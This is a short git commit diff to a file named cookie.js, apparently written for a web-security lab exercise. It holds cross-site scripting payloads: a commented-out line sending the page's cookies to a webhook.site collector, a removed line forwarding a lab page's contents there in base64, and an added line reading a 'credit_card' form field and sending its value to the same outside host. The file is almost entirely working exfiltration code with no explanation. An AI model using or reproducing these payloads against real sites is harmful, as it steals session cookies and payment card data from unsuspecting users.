e48bd0bef38ab62fa52f14e848c3f2e5aa39ee96
alakinnn <hoang2504.rmit@gmail.com>
2025-06-19 19:26:21 +0700

    asdf

--- cookie.js
+++ cookie.js
@@ -1,4 +1,2 @@
 // fetch('https://webhook.site/0c9edde2-c363-47be-8a34-7816750a41f5/?c=' + document.cookie)
-fetch('https://crush.cyberjutsu-lab.tech/current')
-  .then(r => r.text())
-  .then(t => fetch('https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f/log?d=' + btoa(t)));
+fetch('https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f/log?c=' + encodeURIComponent(document.getElementById('credit_card').value));
